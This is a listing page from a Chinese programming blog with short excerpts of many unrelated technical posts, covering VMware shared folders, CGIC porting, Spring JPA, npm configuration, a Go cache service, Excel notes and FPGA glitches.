		<a class="list__footer-readmore btn" href="/posts/4e09bea1330e61eed8bfbbffc78600c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e2acc04d59151c2d44261d43a04fedc/" rel="bookmark">
			VMware共享文件夹报错 解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果你的报错和我相同
E: 无法定位软件包 open-vm-dkms
使用如下命令代替
sudo apt-get install open-vm-tools-desktop 原因是安装包名变了
之后使用该命令进行挂载
sudo vmhgfs-fuse .host:/ /mnt/hgfs //vmhgfs-fuse .host:/ /mnt/hgfs 挂载成功后如图所示
另外附上安装tools工具的极简方法
sudo apt-get upgrade sudo apt-get install open-vm-tools-desktop -y sudo reboot 三步走完，tools成功安装
如果想要以普通用户使用共享文件请参考https://blog.csdn.net/sinat_34613140/article/details/79147748
1.首先输入vmware-hgfsclient，看看是否共享文件夹已经建立，没有的话去参考其他博客，这里不再多说。
如果已经存在的话就进行第2步；
2.输入cd /mnt，跳转到mnt目录下，执行ls -l，查看文件以及权限。
这里看到hgfs的权限是可读可执行但不可写，归属人是root，这里就是根源所在，此时执行第3步；
3.输入sudo chmod 777 ./hgfs，再ls -l查看权限，得到结果如下：
4.修改归属人和归属组，输入sudo chown wilburn:wilburn hgfs -R，得到下图
5.此时再使用挂载命令：vmhgfs-fuse .host:/ /mnt/hgfs，执行成功，不需要使用sudo，问题解决。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2dcf9692069e709280f0974273665bf3/" rel="bookmark">
			CGI的认识与CGIC的移植
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在最前面 华清远见教育集团
15年专注高端IT培训
做良心教育，做专业教育，做受人尊敬的职业教育
创客学院官网：http://www.makeru.com.cn/
华清远见创客学院嵌入式课程链接：http://www.makeru.com.cn/emb
华清远见创客学院物联网课程链接：http://www.makeru.com.cn/iot
概述 CGI 是Web 服务器运行时外部程序的规范,按CGI 编写的程序可以扩展服务器功能。CGI 应用程序能与浏览器进行交互,还可通过数据库API 与数据库服务器等外部数据源进行通信,从数据库服务器中获取数据。格式化为HTML文档后，发送给浏览器，也可以将从浏览器获得的数据放到数据库中。几乎所有服务器都支持CGI,可用任何语言编写CGI,包括流行的C、C ++、VB 和Delphi 等。CGI 分为标准CGI 和间接CGI两种。标准CGI 使用命令行参数或环境变量表示服务器的详细请求，服务器与浏览器通信采用标准输入输出方式。间接CGI 又称缓冲CGI,在CGI 程序和CGI 接口之间插入一个缓冲程序，缓冲程序与CGI 接口间用标准输入输出进行通信。
目的：本文从学习的角度来认识CGI。重点是对整体框架的理解，和对CGIC在嵌入式环境的移植。
框图 CGI程序的工作一般就是接收表单数据，进行数据处理，最后根据处理结果生成新的页面返回给浏览器。
CGIC CGIC是一个功能比较强大的支持CGI开发的标准C库，并支持Linux, Unix 和Windows等多操作系统
源码分析 cgic源码里面有大约10个文件
cgic.h：头文件；
cgic.c：CGIC的源代码文件；
cgictest.c：CGIC库的作者提供的一个CGI程序例子；
capture.c：用于调试CGI程序的工具；
Makefile：安装CGIC的脚本文件；
用户操作流程分析 用户通过客户端应用(浏览器)向web服务发送一个get请求，web服务器返回一个默认的静态html页面；用户想在这个基础上进一步操作，比如用户登录，需要填写 '用户名-密码' 吧，这样提交的信息就以form表单的形式从web服务器，再通过CGI接口向服务器上的应用发送。CGI就是这么一个中间机制，这里简单理解就是讲前端产生的html语言转换成应用层的c语言，实现交互。
CGIC的移植过程 源码移植 1.下载源码
http://www.boutell.com/cgic/
2.解压
root@linux:cgi_test# tar -xvf cgic205.tar.gz 3.修改交叉编译环境
root@linux:cgic205# cd ./cgic205 root@linux:cgic205# vim Makefile CC=arm-none-linux-gnueabi-gcc AR=arm-none-linux-gnueabi-ar RANLIB=arm-none-linux-gnueabi-ranlib #gcc cgictest.o -o cgictest.cgi ${LIBS} $(CC) $(CFLAGS) cgictest.o -o cgictest.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2dcf9692069e709280f0974273665bf3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8dd2ebb6bab1b5edb6bc6dc94c7c71c5/" rel="bookmark">
			springboot java.util.NoSuchElementException: No value present 异常处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 当通过jpa通过id查询时，使用 findById(id).get()，当id不存在当，也就是数据库没有对应当id数据时，就回报上面当异常
后来查看源码，发现：
public T get() { if (value == null) { throw new NoSuchElementException("No value present"); } return value; } 也就是说当查不到值的时候，jpa统一处理为抛异常，所以每次取之前都要判断有没有数据，后来发现了这个
public boolean isPresent() { return value != null; } 于是代码就这样写
Optional&lt;T&gt; optionalT = orderDetailRepository.findById(id); return optionalT.isPresent() ? optionalT.get(): null; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/824bf06c388f5f664ec815418707a1e0/" rel="bookmark">
			javascript 中设置、读取、删除CSS原生变量的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 // 设置变量 document.body.style.setProperty('--primary', '#7F583F'); // 读取变量 document.body.style.getPropertyValue('--primary').trim(); // '#7F583F' // 删除变量 document.body.style.removeProperty('--primary'); 在 JavaScript 中 document.documentElement 即代表文档根元素。所以要改变全局的 CSS 变量，可以这样写：
document.documentElement.style.setProperty('--base', '#fff'); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/073e7680dfffb87570e308e17c06784a/" rel="bookmark">
			三维重建-使用开源库openMVG与openMVS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在前面我们已经介绍了编译openMVG与openMVS的方法，得到了openMVG与openMVS的x64位的Debug版本和Release版本
vcpkg问题-环境配置
关于使用vcpkg的一些技巧补充
openMVG编译
openMVS编译
参考博客：
https://blog.csdn.net/qq_39615622/article/details/80967378
&lt;images-dir&gt;:放置照片组的文件夹； &lt;sensor-database-dir&gt; :/openMVG/src/openMVG/exif/sensor_width_database/sensor_width_camera_database.txt //一般都是这个目录，记得将我们的相机的参数添加进去，注意格式； &lt;output-dir&gt;:输出的目录； images-dir G:\VS2017code\openMVG_openMVS\IMG1\images
output-dir G:\VS2017code\openMVG_openMVS\IMG1\build
sensor-database-dir G:\VS2017code\openMVG\openMVG\src\openMVG\exif\sensor_width_database\sensor_width_camera_database.txt
首先是MVG的步骤：
1. openMVG_main_SfMInit_ImageListing -i &lt;images-dir&gt; -d &lt;sensor-database-dir&gt; -o &lt;output-dir&gt;： 2. openMVG_main_ComputeFeatures -i &lt;output-dir&gt;/sfm_data.json -o &lt;output-dir&gt;： 3. openMVG_main_ComputeMatches -i &lt;output-dir&gt;/sfm_data.json -o &lt;output-dir&gt;： 4. openMVG_main_IncrementalSfM -i &lt;output-dir&gt;/sfm_data.json -m &lt;output-dir&gt; -o &lt;output-dir&gt;/reconstruction 注意：&lt;output-dir&gt;/reconstration 后面的reconstruction这是我们自定义的文件夹； 5. openMVG_main_ComputeSfM_DataColor -i &lt;output-dir&gt;/reconstrution/sfm_data.bin -o &lt;output-dir&gt;/colored.ply： 注意这里的colored.ply是自己命名的文件但是必须要以.ply为后缀； 6. openMVG_main_ComputeStructureFromKnownPoses -i &lt;output-dir&gt;/reconstrution/sfm_data.bin -m . -o &lt;output-dir&gt;/reconstrution/robust.bin -f &lt;output-dir&gt;/matches.f.bin： 注意：这里的robust.bin是我们自己命令的文件，但是必须以.bin为后缀名； 1、
./openMVG_main_SfMInit_ImageListing.exe -i G:\VS2017code\openMVG_openMVS\IMG1\images -d G:\VS2017code\openMVG\openMVG\src\openMVG\exif\sensor_width_database\sensor_width_camera_database.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/073e7680dfffb87570e308e17c06784a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e8131b29a3cde2b359d9d4ab181fc32/" rel="bookmark">
			RePlugin插件化框架——插件的生成代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		插件的生成总结
1. 项目下build文件下：
dependencies {
classpath 'com.android.tools.build:gradle:3.2.1'
classpath 'com.qihoo360.replugin:replugin-plugin-gradle:2.3.1'
// NOTE: Do not place your application dependencies here; they belong
// in the individual module build.gradle files
}
添加：
classpath 'com.qihoo360.replugin:replugin-plugin-gradle:2.3.1'
一行。
2. app/build文件下的android{}后面添加：
apply plugin: 'replugin-plugin-gradle'
3. 引入包：
implementation 'com.qihoo360.replugin:replugin-plugin-lib:2.3.1'
4. AndroidManifest.xml中的application标签中添加插件名：
&lt;application
.....
&gt;
&lt;meta-data
android:name="com.qihoo360.plugin.name"
android:value="hcm_plugin" /&gt;
...
&lt;/application&gt;
经过以上四步，将项目打包并将apk包名修改为上述的插件名，然后将apk包导入到手机的sk卡目录（或其他的什么地方），就可以由宿主安装并启动插件了。
注意：
（1）插件安装成功以后，导入的apk安装包会被删除，所以到下一次安装的时候会提示安装包不存在，所以安装之前需要判断安装包是否存在。
（2）插件卸载时并不是立即生效，需要重启app才可以。有可能在点击菜单键“□”清除app以后重新启动无法完成卸载，那么可能需要点击两次返回键“◁”才能完成卸载。
以上还只是基本的插件的生成，仅限于打开插件的MainActivity，还有更多的关于四大组件的注册和使用需要去探索。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71c598d95ac5b31226bef66e4990184d/" rel="bookmark">
			王佩丰   Excel 24节课  学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		王佩丰 Excel 24节课 学习笔记## 第1讲 Excel的简单认识
大批量输入公式前不用输入=的操作：文件，选项，高级，Lotus公式XLW 工作区
可同时调出多个窗格作对比，编辑其中一个窗格另外窗格也会跟随变化
视图，新建窗口，全部重排。2010版有直接保存工作区，2013我没找到Shift可连选，Ctrl也可连选，但两种连选不一样交换两列的次序：选中其中一列，将鼠标放在边框线上，会变成上下左右的方位键，拉到另一列的旁边即可同时选中多列再去调整列宽可以将所有列宽一起调整。选择多列在其中一个边框上双击也可将所有列宽调整成刚好能容纳的宽度。行也是如此。怎样到达表格的最后：将鼠标放在任意一个单元格的下边线上，双击，会自动跳到最后一个单元格。放到上边线双击是跳到第一个单元格。左右也是如此。冻结窗格：视图，冻结窗格，可做各种冻结操作。填充柄 按Ctrl往下拖可以按顺序排下去，Ctrl +; 键可以直接输入今天日期。
随便写个日期，变成加号可以拖动时用右键往下拖会出现多种可选择的拖动方式，比如按工作日填充、按月填充等，很智能。
也可以自定义列表。文件，选项，高级，数据上面的编辑自定义列表，自己编辑即可。 第2讲 单元格格式设置 （化妆）
批量操作合并居中：可同时选出几行，合并并居中点开下拉三角，跨越合并加斜线的表头：Alt+回车是软回车，可强制分行。实际是在表格中加了条斜线然后将两个项目用软回车强制隔开，调整好位置即可。单元格数字格式中 自定义数字格式
修改日期，y m d a 的用法
文本格式最特殊，数字显示最多只能显示15位，所以18位的身份证号无法正常显示。而且，文本格式不能通过直接调整单元格格式调成其他格式。正确的应该是选中所有文本，点旁边的小叹号，转换成数值。如果有文本有数值，可以在旁边写个1，让每个数都乘以1，就可以将文本强制转化成数值。TXT文本拷到Excel里：数据，分列，下一步，确定分隔符号，完成即可。注意，中文逗号跟英文的半角逗号注意区分开。（为了准确可以直接去复制过来的文本直接复制符号）文本形式的日期要改成年月日的数值形式怎么改：数据，分列，改成常规，就可以变成数值形式了。（分列中有一个强大的地方就是可以将一列做常规和文本之间的转化） 第3讲 查找和替换
如果同时有苏州和苏州市，要将所有的苏州替换成苏州市（直接查找苏州替换苏州市会变成苏州市市）：替换，苏州，苏州市，选项，单元格匹配，全部替换即可。
格式的替换模糊查找：通配符：* （如张* 所有以张开头都会替换） ？（此为英文半角符号，非中文符号。限定为1个字符，注意点开选项，勾选单元格匹配） ~（不生效，一般配合* ？使用）Ctrl+f 查找 Ctrl+h 替换 Windows+e 打开我的电脑 Windows+L 锁屏
Alt+tab 切换视图同时显示所有批注：审阅，显示所有批注 单个批注的修改可单击右键如何更改批注形状：首次操作，随意插入一个形状，出现格式按钮，点开编辑形状的下拉三角，悬停在更改形状右键，加到快速访问工具栏，然后就可修改批注形状了。单击右键修改批注，选中批注外边框，点开形状工具栏选择合适形状。批量操作批注和公式等可以用定位，定位条件重要操作：选中一个区域，在单元格输入内容，按Ctrl+回车可以使所有选中的单元格都填上同样的内容。遇到单元格合并了需要计算如何处理（本讲合并窗口）：先取消合并居中，选中工作表用定位条件定位到空格区域，输入=上键（上下左右的上，也可直接点击第一个空格上面的单元格）然后 Ctrl+回车批量删除Excel中的图片：定位条件，对象，选出之后删除就好。 第4讲 排序与筛选
做工资表：现复制足够的工资表表头，然后给人编号如1到10，对复制的表头编号如1.5到10.5，升序排列即可呈现穿插效果。注意灵活运用。如两列数据要穿插排在一列可用同样方法如何使打印出的每一页都有表头：页面布局，打印标题，工作表，确定顶端标题行即可筛选后的图表复制粘贴到其他地方的时候有可能把隐藏的数据也全都复制过去了，这个时候该如何处理：选中图表，定位条件选择可见单元格，再复制粘贴就好了。数据筛选、文本筛选、模糊筛选高级筛选
筛选不重复目录：数据，高级筛选，勾选选择不重复的记录
且的筛选：可用一般的筛选工具先筛出第一个条件，再从筛过的数据中筛第二个条件。或者用高级筛选。填好列表区域（Ctrl+A可选中全表，也可先点中A1，然后Ctrl+Shift,再右，下 ）、条件区域，其中制作条件区域如下左即可 部门 科目划分
一车间 邮寄费
部门 科目划分
一车间 邮寄费
或的筛选：只能用高级筛选，以上同上，但制作的条件区域如上右
条件并列是且的关系，条件错开是或的关系
6. 筛选出一车间或大于3000的二车间或发生额大于10000的数据
部门 发生额
一车间 二车间 &gt;3000
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/71c598d95ac5b31226bef66e4990184d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c0f3b379b2c64d53ed72313c990436f/" rel="bookmark">
			antdesign pro 或react项目集成dragact和echarts实现图表动态布局的面板
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.安装依赖
npm install --save dragact
npm install --save echarts-for-react
npm install --save echarts
嫌npm慢可以自行使用cnpm安装
2.项目中引用
import ReactEcharts from ‘echarts-for-react’;
import { Dragact } from ‘dragact’;
3.主要代码
&lt;Row&gt; &lt;Col span={2} onClick={this.addDragact}&gt;新增&lt;/Col&gt; &lt;Col span={2} onClick={this.saveLayOut}&gt;保存&lt;/Col&gt; &lt;Col span={2}&gt;回退&lt;/Col&gt; &lt;/Row&gt; &lt;div style={{height:'600px',width:'1000px', border:'1px solid #ccc'}}&gt; &lt;Dragact layout={this.state.fakeData}//必填项 col={12}//必填项 width={1000}//必填项 rowHeight={40}//必填项 margin={[5, 5]}//必填项 className='plant-layout'//必填项 style={{ height:'300px' }}//非必填项 placeholder={true}//非必填项 ref={node =&gt; node ? this.state.dragactNode = node : null} onDragEnd={this.handleOnDragEnd} &gt; {(item, provided) =&gt; { return ( &lt;div {.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c0f3b379b2c64d53ed72313c990436f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2de11e72ce6c30f82c1cfed72b7a408/" rel="bookmark">
			class com.sun.jersey.core.impl.provider.entity.XMLJAXBElementProvider$Text
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		运行mapreduce的wordcount时遇到的奇葩的错误：
Caused by: java.lang.ClassCastException: class com.sun.jersey.core.impl.provider.entity.XMLJAXBElementProvider$Text
at java.lang.Class.asSubclass(Class.java:3404)
at org.apache.hadoop.mapred.JobConf.getOutputKeyComparator(JobConf.java:887)
at org.apache.hadoop.mapred.MapTask$MapOutputBuffer.init(MapTask.java:1004)
at org.apache.hadoop.mapred.MapTask.createSortingCollector(MapTask.java:402)
... 10 more
2018-12-03 11:32:11,903 INFO [main] mapreduce.Job (Job.java:monitorAndPrintJob(1411)) - Job job_local214219855_0001 running in uber mode : false
2018-12-03 11:32:11,905 INFO [main] mapreduce.Job (Job.java:monitorAndPrintJob(1418)) - map 0% reduce 0%
2018-12-03 11:32:11,906 INFO [main] mapreduce.Job (Job.java:monitorAndPrintJob(1431)) - Job job_local214219855_0001 failed with state FAILED due to: NA
2018-12-03 11:32:11,910 INFO [main] mapreduce.Job (Job.java:monitorAndPrintJob(1436)) - Counters: 0
找了半天结果是Text的包导入错了
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c2de11e72ce6c30f82c1cfed72b7a408/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1705183e2036c68cf13e08c6c1d5ff1/" rel="bookmark">
			npm安装依赖的位置设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		npm 依赖安装 npm 全局安装依赖位置默认是c盘，c盘一般是系统安装盘，装太多东西容易造成系统运行缓慢，因此想将依赖包安在指定位置。
nodejs的安装 nodejs的安装可以直接到菜鸟教程查看：
http://www.runoob.com/nodejs/nodejs-install-setup.html
nodejs的安装包下载位置：
https://nodejs.org/en/download/
npm与nodejs是同时安装的，首先查看node是否安装成功，打开命令行输入：
node --version 查看默认依赖的全局安装位置 因为项目中安装的依赖一般都是在当前项目的node_modules文件夹中，不需要特意设置，只要是通过npm install --save modulename方式安装都是在本地项目的文件夹中，所以这里的安装位置是指的全局安装。
以下命令均可查看全局安装位置：
npm config ls 命令npm get prefix命令 设置依赖的全局安装位置 若是默认路径不是你想要使用的路径，并且想要使用nodejs的安装位置:
首先创建node_cache与node_global文件夹，然后设置 全局安装位置
npm set cache D:\ST\nodejs\node_cache npm set prefix D:\ST\nodejs\node_global 设置后在获取得到你想要的路径：
重启命令终端后可以进行全局安装
nodejs环境变量设置 “我的电脑”-右键-“属性”-“高级系统设置”-“高级”-“环境变量”
系统变量设置NODE_PATH=D:\ST\nodejs\node_global\node_modules
设置 用户变量 Path=D:\ST\nodejs\node_global
设置用户变量时如果path已经有值，请在之前设置值得末尾添加";",英文字符的";"，然后在添加D:\ST\nodejs\node_global
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c42cbb0c8fb5b49a2d40d9dfa9692dcd/" rel="bookmark">
			shiro 异常处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		UnknownAccountException (用户名错误或者不存在)
IncorrectCredentialsException(密码不正确)
AuthenticationException 异常是Shiro在登录认证过程中，认证失败需要抛出的异常。
AuthenticationException包含以下子类：
CredentitalsException 凭证异常
IncorrentCredentialsException 不正确的凭证
ExpiredCredentialsException 凭证过期
AccountException 账号异常
ConcurrentAccessException 并发访问异常（多个用户同时登录时抛出）
UnknownAccountException 未知的账号
ExcessiveAttemptsException 认证次数超过限制
DisabledAccountException 禁用的账号
LockedAccountException 账号被锁定
UnsupportedTokenException 使用了不支持的Token
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22179cf86a7d4c407cb0de0336054013/" rel="bookmark">
			如何用GO语言编写缓存服务？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着互联网的飞速发展，各行各业对互联网服务的要求也越来越高，服务架构能撑起多大的业务数据？服务响应的速度能不能达到要求？我们的架构师每天都在思考这些问题。
对于数据库或者对象存储等服务来说，它们受限于自己先天的设计目标，往往不能具有很好的性能，响应时间通常是秒级。此时就需要高性能的缓存来为我们的服务提速了，缓存服务的响应时间通常是毫秒级，甚至小于1ms。
缓存服务需要被设置在其他服务的前端，客户端首先访问缓存，查询自己的数据，仅当客户端需要的数据不存在于缓存中时，才去访问实际的服务。从实际的服务中获取到的数据会被放在缓存中，以备下次使用。
缓存的设计目标就是尽可能地快，但它引起了其他的问题。比如目前业界使用较多的缓存服务有Memcached和Redis等，它们都是内存内缓存，单节点最大的容量不能超过整个系统的内存。
且一旦服务器重启，对于Memcached来说就是内容彻底丢失；Redis稍好一点，但也要花费不少时间从磁盘上的数据文件中重新读入内存。
当我们决定要用Go语言编写一个缓存服务的时候，首先想到的就是HTTP服务。因为用Go语言写基于HTTP的缓存服务真的是太方便了，我们只需要一个map来保存数据，写一个handler负责处理请求，然后调用http.ListenAndServe，最后用go run运行。一切就是这么简单，你不需要去考虑复杂的并发问题，也不需要自己设计一套网络协议，Go语言的HTTP服务框架会帮你处理好底层的一切。
我们在本文将要实现的是一个简单的内存缓存服务，所有的缓存数据都存储在服务器的内存中。一旦服务器重启，所有的数据都将被清零。
缓存服务的接口
1.1.1　REST接口
本章的接口支持缓存的设置（Set）、获取（Get）和删除（Del）这3个基本操作，同时还支持对缓存服务状态的查询。Set操作用于将一对键值对（key value pair）设置进缓存服务器，它通过HTTP的PUT方法进行；Get操作用于查询某个键并获取其值，它通过HTTP的GET方法进行；Del操作用于从缓存中删除某个键，它通过HTTP的DELETE方法进行。我们可以查询的缓存服务状态包括当前缓存了多少对键值对，所有的键一共占据了多少字节，所有的值一共占据了多少字节。​
客户端通过HTTP的PUT方法将一对键值对设置进缓存服务器，服务器将该键值对保存在内存堆上创建的map里。
​这里/cache/是一个URL，它标识了缓存的值（value）所在的位置。URL是Uniform Resource Locator的缩写，它是一个网络地址，用于引用某个网络资源在网络上的位置。HTTP的请求正文（request body）里包含了该key对应的value的内容。​
客户端通过HTTP的GET方法从缓存服务器上获取key对应的value，服务器在map中查找该key，如果key不存在，服务器返回HTTP错误代码404 NOT FOUND；如果key存在，则服务器在HTTP响应正文（response body）中返回相应的value。
​客户端通过HTTP的GET方法从缓存服务器上获取key对应的value，服务器在map中查找该key，如果key不存在，服务器返回HTTP错误代码404 NOT FOUND；如果key存在，则服务器在HTTP响应正文（response body）中返回相应的value。
客户端通过HTTP的DELETE方法将key从缓存中删除。无论之前该key是否存在，之后它都将不存在，服务器始终返回HTTP错误代码200 OK。
​客户端通过这个接口获取缓存服务的状态，在HTTP响应正文中返回的状态是以JSON格式编码的一个cache.Stat结构体（见例1-3）。
1.1.2　缓存Set流程
我们可以用一张简单的图来概括Set流程，见图1-1。
图1-1　in memory缓存的Set流程
客户端的PUT请求提供了key和value。cacheHandler实现了http.Handler接口，其ServeHTTP方法对HTTP请求进行解析，并调用cache.Cache接口的Set方法。
在cache模块中，inMemoryCache结构体实现Cache接口，其Set方法最终将键值对保存在内存的map中。cacheHandler最后会返回客户端一个HTTP错误号来表示结果，如果成功则返回的是200 OK，否则返回500 Internal Server Error。
Go语言中的map的含义和用法跟大多数现代编程语言中的map一样，map是一种用于保存键值对的散列表数据结构，可以通过中括号 [ ] 进行key的查询和设置。
由于程序会对key进行散列和掩码运算以直接获取存储key的偏移量，所以能获得近乎O(1)的查询和设置复杂度。之所以说近乎O(1)是因为两个key在经过散列和掩码运算后有可能会具有相同的偏移量，此时将不得不继续进行线性搜索，不过发生这种不幸情况的概率很小。
1.1.3　缓存Get流程
缓存Get流程见图1-2。
图1-2　in memory缓存的Get流程
客户端的Get请求提供了key。cacheHandler的ServeHTTP方法对HTTP请求进行解析，并调用cache.Cache接口的Get方法。inMemoryCache结构体的Get方法在map中查询key对应的value并返回。cacheHandler会将value写入HTTP响应正文并返回200 OK，如果cache.Cache.Get方法返回错误，cacheHandler会返回500 Internal Server Error。如果value长度为0，说明该key不存在，cacheHandler会返回404 Not Found。
1.1.4　缓存Del流程
缓存Del流程见图1-3。
图1-3　in memory缓存的Del流程
客户端的DELETE请求提供了key。cacheHandler的ServeHTTP方法对HTTP请求进行解析，并调用cache.Cache接口的Del方法。inMemoryCache结构体的Del方法在map中查询key是否存在，如果存在则调用delete函数删除该key。如果cache.Cache.Del方法返回错误，cacheHandler会返回500 Internal Server Error，否则返回200 OK。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/22179cf86a7d4c407cb0de0336054013/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f3d707f8020d9958f24f28e2f3894d1/" rel="bookmark">
			WPS光标消失，无法打字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现象:
WPS 打字时，光标突然消失，然后无法打字，过几秒钟又回来了。
用录屏工具观察任务管理器中的额进程，发现一个特别程序wpsrenderer.exe出现时，光标会消失。
网上查询了下，这个是WPS的云登录和广告推送程序，把它删除就好了。
我电脑上的路径：
E:\Program Files\WPS Office\10.1.0.7245\10.1.0.7346\office6
我是通过everything搜索软件找的，然后直接把这个烦人的程序删除了：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f40f4620132d6edfa3d155f00b641814/" rel="bookmark">
			组合逻辑设计中的毛刺现象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		和所有的数字电路一样，毛刺也是FPGA电路中的棘手问题，它的出现会影响电路工作的稳定性，可靠性，严重时会导致整个数字系统的误动作和逻辑紊乱。
信号在FPGA器件中通过逻辑单元连线时，一定存在延时。延时的大小不仅和连线的长短和逻辑单元的数目有关，而且也和器件的制造工艺、工作电压、温度等有关。
另外，信号的高低电平转换也需要一定的过渡时间，由于存在这两方面的因素，多路信号的电平值发生变化时，在信号变化的瞬间，组合逻辑的输出有先后顺序，并不是同时变化，往往会出现一些不正确的尖峰信号，这些尖峰信号就是“毛刺”。任何组合电路，反馈电路和计数器都可能。
潜在的毛刺信号发生器。
电路布线长短不同造成各端口输入信号延时不一致，有竞争冒险，会产生毛刺。分立元件之间存在分布电容和电感可以滤掉这些毛刺，所以用分立元件设计电路时，很少考虑竞争冒险和毛刺问题，但PLD/FPGA内部没有分布电容和电感，不能滤掉任何毛刺（哪怕不到1ns)。
举个简单的例子：
设计的一个二输入与门，output&lt;=A &amp; B;进行布局布线后仿真（此时没有加管脚约束文件）可看到：
output_obuf_2处有一毛刺出现。毛刺高电平时间维持141ps。
从output_obuf到output输出处，虽消除了毛刺，但不能保证其它情况下都会消除，我想有可能是此处毛刺时间比较小的原因，所以才有output处输出是正常的。
首先毛刺的出现是由于输入端A由1到0和B由0到1的变化引起的。
从静态时序文件中可以看到：A，B到达与门的时间相差141ps，这也正是上述中出现毛刺的原因。
下面将管脚约束文件加进去再进行后仿真：
可看出此时output输出有明显的毛刺出现。
时序分析报告：
对于信号A:(Trace delay of A)+AND gate internal delay=9.139ns;
对于信号B:(Trace delay of B)+AND gate internal delay=5.607ns;
即A和B到达与门的时间相差了3.532ns,下图显示毛刺的时间即正好相符。
毛刺并不是对所有的输入都有危害，如触发器的D输入端，只要数据不出现在时钟的上长升沿，并满足数据的建立保持时间，就不会对系统造成危害，而当毛刺信号成为系统的启动信号，控制信号，握手信号，触发器的清零信号，预置信号，时钟信号，或锁存器的输入信号时就会产生逻辑错误。因此，判断逻辑电路中是否存在冒险以及如何避免冒险是设计人员必须考虑的问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba65376ec765daf6316f4667d6d176a0/" rel="bookmark">
			4）Thymeleaf th:each 循环迭代与 th:if、th:switch 条件判断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
th:each 循环迭代
th:each 获取迭代状态
th:if 条件判断 true
th:unless 条件判断 false
th:switch case 条件匹配
th:each 循环迭代 1、对于信息页面，数据格式是一样时，页面通常都是循环迭代它们，写过 JSP 的 JSTL 的就知道，JSTL 有一个 &lt;c:foreach&gt;，同理 Thymeleaf 也有一个 th:each。作用都是一样的，都是用于遍历数组、List、Set、Map 等数据。
2、JSTL th:each 遍历格式如下：
&lt;c:foreach items ="${lis}" var = "li " begin="2" end ="12"&gt; ${li} &lt;/c:foreach&gt; Thymeleaf 遍历格式如下： &lt;tr th:each="user : ${userList}"&gt; &lt;td th:text="${user.name}"&gt;xxx&lt;/td&gt; &lt;/tr&gt; 3、Thymeleaf th:each 遍历格式如下：
&lt;body&gt; &lt;!--后台控制器输出数据：model.addAttribute("userList", User.getUsers());--&gt; &lt;!--public static List&lt;User&gt; getUsers()，即数据格式为常见的：List&lt;User&gt;--&gt; &lt;table border="1"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;工号&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;生日&lt;/th&gt; &lt;th&gt;是否已婚&lt;/th&gt; &lt;th&gt;工资&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba65376ec765daf6316f4667d6d176a0/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/494/">«</a>
	<span class="pagination__item pagination__item--current">495/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/496/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
